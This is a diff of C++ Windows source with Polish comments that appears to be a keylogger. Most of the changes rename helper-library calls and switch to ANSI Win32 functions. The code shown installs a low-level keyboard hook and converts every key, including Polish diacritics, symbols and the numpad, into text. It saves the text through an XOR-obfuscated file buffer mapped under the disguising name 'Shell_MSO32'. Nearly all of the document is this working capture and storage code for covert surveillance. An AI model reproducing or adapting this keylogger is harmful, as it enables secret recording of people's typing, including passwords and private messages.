@@ -1,8 +1,10 @@
-#include ".\..\..\..\x86_libraries\SSTSOFT\SSTSOFT\tsoft_MAIN.h"
-#include ".\..\..\..\x86_libraries\SSTSOFT\SSTSOFT\database\tsoft_database.h"
+#include "./../../../x86_libraries/STK/stk_MAIN.h"
+#include "./../../../x86_libraries/STK/database/stk_database.h"
 //---------------------------------------------------------------------------
 #include <windows.h>
 #include <condefs.h>
+//---------------------------------------------------------------------------
+USELIB("..\..\..\X86_LIBRARIES\STK\stk_lib.lib");
 //---------------------------------------------------------------------------
 #define EXCED 8192
 //---------------------------------------------------------------------------
@@ -46,24 +48,24 @@ DWORD __stdcall error                (void);
 
 __stdcall TBuforPlikowy::TBuforPlikowy(char *Nazwa)
 {
-plik.nazwa = ts::text::c_str::dup(Nazwa);
-bufor.temp = (char*)ts::text::c_str::alloc(EXCED);
+plik.nazwa = stk::cstr::dup(Nazwa);
+bufor.temp = (char*)stk::cstr::alloc(EXCED);
 
 //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 HANDLE FindHand;
- WIN32_FIND_DATA *FindData = new WIN32_FIND_DATA;
-ts::text::c_str::mov(bufor.temp,Nazwa);
-for (ts::text::c_str::exchangechar(bufor.temp,'\\','\0'); ts::text::c_str::len(bufor.temp) < ts::text::c_str::len(Nazwa); bufor.temp[ts::text::c_str::len(bufor.temp)] = '\\')
-    {if ((FindHand = FindFirstFile(bufor.temp,FindData))==INVALID_HANDLE_VALUE)
-          CreateDirectory(bufor.temp, NULL);
+ WIN32_FIND_DATAA *FindData = new WIN32_FIND_DATAA;
+stk::cstr::mov(bufor.temp,Nazwa);
+for (stk::cstr::replace_chr(bufor.temp,'\\','\0'); stk::cstr::len(bufor.temp) < stk::cstr::len(Nazwa); bufor.temp[stk::cstr::len(bufor.temp)] = '\\')
+    {if ((FindHand = FindFirstFileA(bufor.temp,FindData))==INVALID_HANDLE_VALUE)
+          CreateDirectoryA(bufor.temp, NULL);
      else FindClose(FindHand);
     }
 delete FindData;
 
 //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-plik.handPlik = CreateFile(Nazwa,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_DELETE,NULL,OPEN_ALWAYS,NULL,NULL);
+plik.handPlik = CreateFileA(Nazwa,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_DELETE,NULL,OPEN_ALWAYS,NULL,NULL);
 if (plik.handPlik==INVALID_HANDLE_VALUE || plik.handPlik==NULL)
    {error();
     return;
@@ -71,7 +73,7 @@ if (plik.handPlik==INVALID_HANDLE_VALUE || plik.handPlik==NULL)
 bufor.size = GetFileSize(plik.handPlik,NULL);
 if (bufor.size==0)
     bufor.size= 1;
-plik.handMapa = CreateFileMapping(plik.handPlik,NULL,PAGE_READWRITE|SEC_RESERVE|SEC_NOCACHE,0,bufor.size,"Shell_MSO32");
+plik.handMapa = CreateFileMappingA(plik.handPlik,NULL,PAGE_READWRITE|SEC_RESERVE|SEC_NOCACHE,0,bufor.size,"Shell_MSO32");
 if (plik.handMapa==INVALID_HANDLE_VALUE || plik.handMapa==NULL)
    {error();
     return;
@@ -81,7 +83,7 @@ if (bufor.mapa==NULL)
    {error();
     return;
    }
-bufor.pos[PRV] = bufor.pos[CRT] = ts::text::c_str::len(bufor.mapa);
+bufor.pos[PRV] = bufor.pos[CRT] = stk::cstr::len(bufor.mapa);
 }
 //---------------------------------------------------------------------------
 
@@ -96,7 +98,7 @@ char *__stdcall TBuforPlikowy::load(long posEnum, long length)
 if (bufor.pos[posEnum] + length >= bufor.size)
     return NULL;
 
-bufor.temp = ts::text::c_str::realloc(bufor.temp,length + 1);
+bufor.temp = stk::cstr::realloc(bufor.temp,length + 1);
 strncpy(bufor.temp,(char*)((unsigned long)bufor.mapa + bufor.pos[posEnum]),length);
 for (int p = 0; p < length; p++)
      bufor.temp[p] = bufor.temp[p] ^ dEXHASLO;
@@ -106,7 +108,7 @@ return bufor.temp;
 
 DWORD __stdcall TBuforPlikowy::save(char *info, long posEnum) {
 static DWORD length;
-length = ts::text::c_str::len(info);
+length = stk::cstr::len(info);
 
 if (bufor.pos[posEnum] + length > (unsigned __int32)bufor.size)
    {bufor.size = bufor.pos[posEnum]+length + EXCED;
@@ -131,11 +133,11 @@ DWORD __stdcall TBuforPlikowy::error(void)
 {
 char lpMsgBuf[256];
 MessageBeep(MB_ICONEXCLAMATION);
-FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
+FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM,
       NULL,GetLastError(),
       MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
       &lpMsgBuf[0],sizeof(lpMsgBuf),NULL);
-return MessageBox(NULL,lpMsgBuf,"Problem z...",
+return MessageBoxA(NULL,lpMsgBuf,"Problem z...",
 MB_OKCANCEL + MB_DEFBUTTON1 + MB_ICONERROR);
 }
 //---------------------------------------------------------------------------
@@ -150,7 +152,7 @@ if (plik.handPlik!=INVALID_HANDLE_VALUE && plik.handPlik!=NULL)
             UnmapViewOfFile(bufor.mapa);
        }
    }
-ts::text::c_str::free(plik.nazwa); ts::text::c_str::free(bufor.temp);
+stk::cstr::free(plik.nazwa); stk::cstr::free(bufor.temp);
 }
 //---------------------------------------------------------------------------
 
@@ -158,11 +160,11 @@ DWORD __stdcall error(void)
 {
 char lpMsgBuf[256];
 MessageBeep(MB_ICONEXCLAMATION);
-FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
+FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM,
       NULL,GetLastError(),
       MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
       &lpMsgBuf[0],sizeof(lpMsgBuf),NULL);
-return MessageBox(NULL,lpMsgBuf,"Problem z...",
+return MessageBoxA(NULL,lpMsgBuf,"Problem z...",
 MB_OKCANCEL + MB_DEFBUTTON1 + MB_ICONERROR);
 }
 
@@ -235,107 +237,107 @@ break;
              //  MA£E LITERY
              if (pkbdllhook->vkCode=='A')
                 {
-                 ts::text::c_str::mov(lpklawisz,"a"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"a"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='B')
                 {
-                 ts::text::c_str::mov(lpklawisz,"b"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"b"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='C')
                 {
-                 ts::text::c_str::mov(lpklawisz,"c"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"c"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='D')
                 {
-                 ts::text::c_str::mov(lpklawisz,"d"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"d"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='E')
                 {
-                 ts::text::c_str::mov(lpklawisz,"e"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"e"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='F')
                 {
-                 ts::text::c_str::mov(lpklawisz,"f"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"f"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='G')
                 {
-                 ts::text::c_str::mov(lpklawisz,"g"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"g"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='H')
                 {
-                 ts::text::c_str::mov(lpklawisz,"h"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"h"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='I')
                 {
-                 ts::text::c_str::mov(lpklawisz,"i"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"i"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='J')
                 {
-                 ts::text::c_str::mov(lpklawisz,"j"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"j"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='K')
                 {
-                 ts::text::c_str::mov(lpklawisz,"k"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"k"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='L')
                 {
-                 ts::text::c_str::mov(lpklawisz,"l"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"l"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='M')
                 {
-                 ts::text::c_str::mov(lpklawisz,"m"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"m"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='N')
                 {
-                 ts::text::c_str::mov(lpklawisz,"n"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"n"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='O')
                 {
-                 ts::text::c_str::mov(lpklawisz,"o"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"o"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='P')
                 {
-                 ts::text::c_str::mov(lpklawisz,"p"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"p"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Q')
                 {
-                 ts::text::c_str::mov(lpklawisz,"q"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"q"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='R')
                 {
-                 ts::text::c_str::mov(lpklawisz,"r"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"r"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='S')
                 {
-                 ts::text::c_str::mov(lpklawisz,"s"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"s"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='T')
                 {
-                 ts::text::c_str::mov(lpklawisz,"t"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"t"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='U')
                 {
-                 ts::text::c_str::mov(lpklawisz,"u"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"u"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='V')
                 {
-                 ts::text::c_str::mov(lpklawisz,"v"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"v"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='W')
                 {
-                 ts::text::c_str::mov(lpklawisz,"w"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"w"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='X')
                 {
-                 ts::text::c_str::mov(lpklawisz,"x"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"x"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Y')
                 {
-                 ts::text::c_str::mov(lpklawisz,"y"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"y"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Z')
                 {
-                 ts::text::c_str::mov(lpklawisz,"z"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"z"); goto zapisz;
                 }
              }
           else
@@ -343,39 +345,39 @@ break;
               //  MA£E Z OGONKAMI
               if (pkbdllhook->vkCode=='A')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\¹"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\¹"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='C')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\æ"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\æ"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='E')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\ê"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\ê"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='L')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\³"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\³"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='N')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\ñ"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\ñ"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='O')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\ó"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\ó"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='S')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\œ"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\œ"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='X')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\Ÿ"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\Ÿ"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='Z')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\¿"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\¿"); goto zapisz;
                  }
              }
          }
@@ -386,107 +388,107 @@ break;
              //  DU¯E LITERY
              if (pkbdllhook->vkCode=='A')
                 {
-                 ts::text::c_str::mov(lpklawisz,"A"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"A"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='B')
                 {
-                 ts::text::c_str::mov(lpklawisz,"B"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"B"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='C')
                 {
-                 ts::text::c_str::mov(lpklawisz,"C"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"C"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='D')
                 {
-                 ts::text::c_str::mov(lpklawisz,"D"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"D"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='E')
                 {
-                 ts::text::c_str::mov(lpklawisz,"E"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"E"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='F')
                 {
-                 ts::text::c_str::mov(lpklawisz,"F"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"F"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='G')
                 {
-                 ts::text::c_str::mov(lpklawisz,"G"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"G"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='H')
                 {
-                 ts::text::c_str::mov(lpklawisz,"H"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"H"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='I')
                 {
-                 ts::text::c_str::mov(lpklawisz,"I"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"I"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='J')
                 {
-                 ts::text::c_str::mov(lpklawisz,"J"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"J"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='K')
                 {
-                 ts::text::c_str::mov(lpklawisz,"K"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"K"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='L')
                 {
-                 ts::text::c_str::mov(lpklawisz,"L"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"L"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='M')
                 {
-                 ts::text::c_str::mov(lpklawisz,"M"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"M"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='N')
                 {
-                 ts::text::c_str::mov(lpklawisz,"N"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"N"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='O')
                 {
-                 ts::text::c_str::mov(lpklawisz,"O"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"O"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='P')
                 {
-                 ts::text::c_str::mov(lpklawisz,"P"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"P"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Q')
                 {
-                 ts::text::c_str::mov(lpklawisz,"Q"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"Q"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='R')
                 {
-                 ts::text::c_str::mov(lpklawisz,"R"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"R"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='S')
                 {
-                 ts::text::c_str::mov(lpklawisz,"S"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"S"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='T')
                 {
-                 ts::text::c_str::mov(lpklawisz,"T"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"T"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='U')
                 {
-                 ts::text::c_str::mov(lpklawisz,"U"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"U"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='V')
                 {
-                 ts::text::c_str::mov(lpklawisz,"V"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"V"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='W')
                 {
-                 ts::text::c_str::mov(lpklawisz,"W"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"W"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='X')
                 {
-                 ts::text::c_str::mov(lpklawisz,"X"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"X"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Y')
                 {
-                 ts::text::c_str::mov(lpklawisz,"Y"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"Y"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Z')
                 {
-                 ts::text::c_str::mov(lpklawisz,"Z"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"Z"); goto zapisz;
                 }
              }
           else
@@ -494,39 +496,39 @@ break;
               //  DU¯E Z OGONKAMI
               if (pkbdllhook->vkCode=='A')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\¥"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\¥"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='C')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\Æ"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\Æ"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='E')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\Ê"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\Ê"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='L')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\£"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\£"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='N')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\Ñ"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\Ñ"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='O')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\Ó"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\Ó"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='S')
                  {
-                 ts::text::c_str::mov(lpklawisz,"\Œ"); goto zapisz;
+                 stk::cstr::mov(lpklawisz,"\Œ"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='X')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\"); goto zapisz;
                  }
               if (pkbdllhook->vkCode=='Z')
                  {
-                  ts::text::c_str::mov(lpklawisz,"\¯"); goto zapisz;
+                  stk::cstr::mov(lpklawisz,"\¯"); goto zapisz;
                  }
              }
          }
@@ -537,87 +539,87 @@ break;
           //
           if (pkbdllhook->vkCode=='1')
              {
-              ts::text::c_str::mov(lpklawisz,"1"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"1"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='2')
              {
-              ts::text::c_str::mov(lpklawisz,"2"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"2"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='3')
              {
-              ts::text::c_str::mov(lpklawisz,"3"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"3"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='4')
              {
-              ts::text::c_str::mov(lpklawisz,"4"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"4"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='5')
              {
-              ts::text::c_str::mov(lpklawisz,"5"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"5"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='6')
              {
-              ts::text::c_str::mov(lpklawisz,"6"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"6"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='7')
              {
-              ts::text::c_str::mov(lpklawisz,"7"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"7"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='8')
              {
-              ts::text::c_str::mov(lpklawisz,"8"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"8"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='9')
              {
-              ts::text::c_str::mov(lpklawisz,"9"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"9"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='0')
              {
-              ts::text::c_str::mov(lpklawisz,"0"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"0"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBD)
              {
-              ts::text::c_str::mov(lpklawisz,"\-"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\-"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBB)
              {
-              ts::text::c_str::mov(lpklawisz,"\="); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\="); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDC)
              {
-              ts::text::c_str::mov(lpklawisz,"\\"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\\"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDB)
              {
-              ts::text::c_str::mov(lpklawisz,"\["); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\["); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDD)
              {
-              ts::text::c_str::mov(lpklawisz,"\]"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\]"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBA)
              {
-              ts::text::c_str::mov(lpklawisz,"\;"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\;"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDE)
              {
-              ts::text::c_str::mov(lpklawisz,"\'"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\'"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBC)
              {
-              ts::text::c_str::mov(lpklawisz,"\,"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\,"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBE)
              {
-              ts::text::c_str::mov(lpklawisz,"\."); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\."); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBF)
              {
-              ts::text::c_str::mov(lpklawisz,"\/"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\/"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xC0)
              {
-              ts::text::c_str::mov(lpklawisz,"\`"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\`"); goto zapisz;
              }
          }
       if (Pressed.fMenu!=0 && Pressed.fShift==0)
@@ -625,87 +627,87 @@ break;
           // SZIT znaki specjalne
           if (pkbdllhook->vkCode=='1')
              {
-              ts::text::c_str::mov(lpklawisz,"\!"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\!"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='2')
              {
-              ts::text::c_str::mov(lpklawisz,"\@"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\@"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='3')
              {
-              ts::text::c_str::mov(lpklawisz,"\#"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\#"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='4')
              {
-              ts::text::c_str::mov(lpklawisz,"\$"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\$"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='5')
              {
-              ts::text::c_str::mov(lpklawisz,"\%"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\%"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='6')
              {
-              ts::text::c_str::mov(lpklawisz,"\^"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\^"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='7')
              {
-              ts::text::c_str::mov(lpklawisz,"\&"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\&"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='8')
              {
-              ts::text::c_str::mov(lpklawisz,"\*"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\*"); goto zapisz;
              }
           if (pkbdllhook->vkCode=='9')
              {
-              ts::text::c_str::mov(lpklawisz,"\("); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\("); goto zapisz;
              }
           if (pkbdllhook->vkCode=='0')
              {
-              ts::text::c_str::mov(lpklawisz,"\)"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\)"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBD)
              {
-              ts::text::c_str::mov(lpklawisz,"\_"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\_"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBB)
              {
-              ts::text::c_str::mov(lpklawisz,"\+"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\+"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDC)
              {
-              ts::text::c_str::mov(lpklawisz,"\|"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\|"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDB)
              {
-              ts::text::c_str::mov(lpklawisz,"\{"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\{"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDD)
              {
-              ts::text::c_str::mov(lpklawisz,"\}"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\}"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBA)
              {
-              ts::text::c_str::mov(lpklawisz,"\:"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\:"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xDE)
              {
-              ts::text::c_str::mov(lpklawisz,"\""); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\""); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBC)
              {
-              ts::text::c_str::mov(lpklawisz,"\<"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\<"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBE)
              {
-              ts::text::c_str::mov(lpklawisz,"\>"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\>"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xBF)
              {
-              ts::text::c_str::mov(lpklawisz,"\?"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\?"); goto zapisz;
              }
           if (pkbdllhook->vkCode==0xC0)
              {
-              ts::text::c_str::mov(lpklawisz,"\~"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\~"); goto zapisz;
              }
          }
       if (Pressed.fMenu==0 && (GetKeyState(VK_NUMLOCK)&0x8000)!=0)
@@ -713,63 +715,63 @@ break;
           // NUM
           if (pkbdllhook->vkCode==VK_NUMPAD0) //num
              {
-              ts::text::c_str::mov(lpklawisz,"0"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"0"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD1) //num
              {
-              ts::text::c_str::mov(lpklawisz,"1"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"1"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD2) //num
              {
-              ts::text::c_str::mov(lpklawisz,"2"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"2"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD3) //num
              {
-              ts::text::c_str::mov(lpklawisz,"3"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"3"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD4) //num
              {
-              ts::text::c_str::mov(lpklawisz,"4"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"4"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD5) //num
              {
-              ts::text::c_str::mov(lpklawisz,"5"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"5"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD6) //num
              {
-              ts::text::c_str::mov(lpklawisz,"6"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"6"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD7) //num
              {
-              ts::text::c_str::mov(lpklawisz,"7"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"7"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD8) //num
              {
-              ts::text::c_str::mov(lpklawisz,"8"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"8"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_NUMPAD9) //num
              {
-              ts::text::c_str::mov(lpklawisz,"9"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"9"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_MULTIPLY)
              {
-              ts::text::c_str::mov(lpklawisz,"\*"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\*"); goto zapisz;
              }
